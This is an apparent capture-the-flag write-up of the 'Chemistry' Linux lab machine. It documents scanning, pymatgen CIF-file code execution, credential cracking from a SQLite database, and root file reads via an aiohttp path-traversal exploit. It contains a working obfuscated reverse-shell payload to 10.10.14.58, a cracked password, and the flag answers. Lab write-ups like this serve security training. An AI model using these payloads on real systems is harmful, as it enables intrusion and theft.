---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Chemistry (Easy)

## <mark style="color:blue;">Description</mark>

* **Difficult** <mark style="color:green;">**->**</mark> Easy
* **OS** <mark style="color:green;">**->**</mark> Linux
* **State** <mark style="color:green;">-></mark> Active

<figure><img src="../../.gitbook/assets/image (207).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Write-up</mark>

* I started doing an initial port scan using [_Nmap_](../../networks/tools-and-utilities.md#nmap)

{% code lineNumbers="true" %}
```bash
nmap 10.129.92.228 -p- -Pn --min-rate 2500 -oN scan.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (170).png" alt=""><figcaption></figcaption></figure>

***

* Then I did an exhaustive scan to learn more about the services running on the open ports

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap 10.129.92.228 -p22,5000 -sVC -oN serv_scan.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (171).png" alt=""><figcaption><p>snippet</p></figcaption></figure>

***

* I found the HTTP protocol running on port 5000, in this case, a Universal Plug and Play (UPNP) service that helps in network discovery. So to check it, I navigated to the direction using the browser, and there I found a simple site that seemed to be a program for processing files related to chemistry. I tried to register and log in, which sent me to a dashboard with an option to upload a Crystallographic Information File (CIF)

<figure><img src="../../.gitbook/assets/image (174).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about the HTTP protocol you can go [here](../../networks/protocols/http.md)
{% endhint %}

***

* I didn't know about this type of file but the site also allowed me to download a sample file to check which parameters the page processed and the file format

<figure><img src="../../.gitbook/assets/image (609).png" alt=""><figcaption></figcaption></figure>

***

* As the web let me modify and reupload the file, it could lead to a possible File Upload vulnerability, so I could try to leverage it to gain a Reverse Shell from the server. To do so, I checked on the web for possible CV&#x45;_&#x73;_ and exploits. In this process, I found an interesting [repository](https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f) with a vulnerability that affected the _2024.2.8_ or lower versions and could help me gain RCE on the target

<figure><img src="../../.gitbook/assets/image (556).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about File Upload exploitation you can go [here](../../web-exploitation/broken-access-control/abuse-file-upload.md)
{% endhint %}

***

* With this, I crafted a modified version of the CIF file to execute commands remotely. In that case, I modify it by adding a script to gain the Reverse Shell

{% code title="exploit.cif" overflow="wrap" lineNumbers="true" %}
```
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/10.10.14.58/4444 0>&1\'");0,0,0'
_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```
{% endcode %}

{% hint style="info" %}
I used a custom payload for the reverse shell because some standard payloads didn't work, and the script had special characters that needed to be interpreted&#x20;
{% endhint %}

***

* After that, I uploaded the file to the system and set a [_Netcat_](../../networks/tools-and-utilities.md#netcat) listener in my machine to receive the connection. Then, I clicked the _View_ button to run the internal script, observing the page kept loading and checking that the listener had caught the shell from the host. I also sanitized the terminal to work more comfortably and checked which user I was. having now access as the _app_ user, the one from the web server

{% code lineNumbers="true" %}
```bash
nc -nvlp 4444
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (176).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (177).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (180).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about the sanitization process you can go [here](../../linux/useful-shell-resources.md#tty-sanitization)
{% endhint %}

***

* Then I navigated through the system checking for a possible way to do lateral movement or privilege escalations. I found that in the _/home_ folder there was a folder for another user named _rosa_. I listed the files under this directory and found a _user.txt_ file, but when trying to read its content I didn't have the proper permissions

<figure><img src="../../.gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>

***

* In these circumstances, I needed to do lateral movement to gain access as _rosa_. Searching for any clue about how to do it, I found that under the _/home/app/instance_ folder (which contained files of the web service), there was a _database.db_ file, and checking its type with the `file` command, I confirmed it was a _SQLite3_ database

<figure><img src="../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

***

* Knowing this, I interacted with it and retrieved some information. I queried information about the tables and found a user table, and reading its information I found some users and values that could be hashes for passwords. I noticed in this case there was also a user _rosa_ in this database so I could assume it was the system user and try to crack the hash to obtain the password

{% code overflow="wrap" lineNumbers="true" %}
```bash
sqlite3 database.db
sqlite> .tables
sqlite> SELECT * FROM user;
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (185).png" alt=""><figcaption></figcaption></figure>

***

* To do that, I used the online tool [_Crackstation_](../../cryptography/tools-and-utilities.md#crackstation) to recognize and break the hash, and I was lucky because it was a known MD5 hash that revealed the password _unicorniosrosados_

<figure><img src="../../.gitbook/assets/image (186).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about MD5 or other hashes you can go [here](../../cryptography/hashing-wip/#well-known-hashes)
{% endhint %}

***

* Then, I tried to connect through SSH to the _rosa_ user using this password and got in successfully. I also sanitized again the terminal to interact better with it

<figure><img src="../../.gitbook/assets/image (187).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (189).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn more about the SSH protocol you can go [here](../../networks/protocols/ssh.md)
{% endhint %}

***

* With that, I had proper reading permissions to read the &#x75;_&#x73;er.txt_ file in the _/home/rosa_ folder and retrieved th the user flag

{% code overflow="wrap" lineNumbers="true" %}
```bash
cat user.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (190).png" alt=""><figcaption></figcaption></figure>

***

* With that, I got the user flag

<figure><img src="../../.gitbook/assets/image (757).png" alt=""><figcaption></figcaption></figure>

> Answer: _**4322e11a0bd69f9f5c49e46ce07b3f35**_

***

* Then, I had to find a way to escalate privileges. I started searching but after a while, I didn't find anything. So to facilitate the process I tried using [_Linpeas_](../../penetration-testing/process-stages/post-exploitation/tools-and-utilities.md#linpeas) to help me find possible paths for the escalation. After importing it and running it, in the results obtained, I found there was a service running locally on port 8080, which is normally used for some web servers

<figure><img src="../../.gitbook/assets/image (191).png" alt=""><figcaption><p>snippet</p></figcaption></figure>

***

* As it is locally deployed, I couldn't access the service directly through a browser, but as I had access to the system via SSH, I could try to make a tunnel via local port forwarding to access it from my machine. I did the tunneling process and to confirm it had worked, I accessed the service on the browser and observed the web service deployed correctly

{% code overflow="wrap" lineNumbers="true" %}
```bash
ssh -L 7777:127.0.0.1:8080 rosa@10.129.92.228
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (193).png" alt=""><figcaption><p>snippet</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (194).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (196).png" alt=""><figcaption></figcaption></figure>

***

* I explored the site which seemed to be a statistics service, but after a while, I didn't find anything interesting, so I tried to retrieve information on the components. I used the `curl` command to send a petition and retrieve some information based on the headers of the response

{% code overflow="wrap" lineNumbers="true" %}
```bash
curl http://localhost:7777 --head
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (197).png" alt=""><figcaption></figcaption></figure>

***

* I found the HTTP server was using the [_aiohttp_](https://docs.aiohttp.org/en/stable/) python library to deploy the web content and its corresponding version. With this, I searched for some possible related CVEs, and after some research, I found a _GitHub_ [repository](https://github.com/wizarddos/CVE-2024-23334) with a POC for the _CVE-2024-23334_ which exploited a Local File Inclusion vulnerability on versions 3.9.1 or lower of _aiohttp_ to read files as the _root_ user

<figure><img src="../../.gitbook/assets/image (198).png" alt=""><figcaption><p><a href="https://github.com/wizarddos/CVE-2024-23334">https://github.com/wizarddos/CVE-2024-23334</a></p></figcaption></figure>

{% hint style="success" %}
To learn more about Local File Inclusion exploitation you can go [here](../../web-exploitation/broken-access-control/local-file-inclusion.md)
{% endhint %}

***

* I downloaded the exploit and used it to automatize the attack, but I needed to find a static route to execute the attack. With a little [research](https://stackoverflow.com/questions/62499380/serving-static-files-in-an-http-server), I found some standard folders for static files. I tried some of them in the exploit and noticed that using the _/assets_ route it worked

<figure><img src="../../.gitbook/assets/image (199).png" alt=""><figcaption><p>snippet</p></figcaption></figure>

***

* Finally, as I was reading files as the _root_ user, I tried accessing the _/root_ folder and reading the content of the _root.txt_ if existed, and with that, I luckily retrieved the root flag

<figure><img src="../../.gitbook/assets/image (202).png" alt=""><figcaption></figcaption></figure>

***

* With that, I got the root flag and pwned the machine

<figure><img src="../../.gitbook/assets/image (245) (1).png" alt=""><figcaption></figcaption></figure>

> Answer: _**861d48a12f6494bc174cca5585a3a3e1**_

## <mark style="color:blue;">Alternative Privilege Escalation</mark>

* I could also escalate privileges by retrieving information on the SSH keys for the _root_ user. I checked for them in the standard _/.ssh_ folder using the default name _id\_rsa_, and fortunately, the file existed and leaked the private key

<figure><img src="../../.gitbook/assets/image (203).png" alt=""><figcaption></figcaption></figure>

***

* With this, I copied the key into a local file and used it to access the target via SSH. With that done, I could go to the _/root_ folder and read the _root.txt_ file to retrieve the root flag

{% code overflow="wrap" lineNumbers="true" %}
```bash
ssh root@10.129.92.228 -i id_rsa
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (204).png" alt=""><figcaption><p>snippet</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (205).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
To learn in detail about the abuse of SSH keys for privilege escalation you can go [here](../../penetration-testing/process-stages/post-exploitation/privilege-escalation/#abusing-ssh-keys)
{% endhint %}
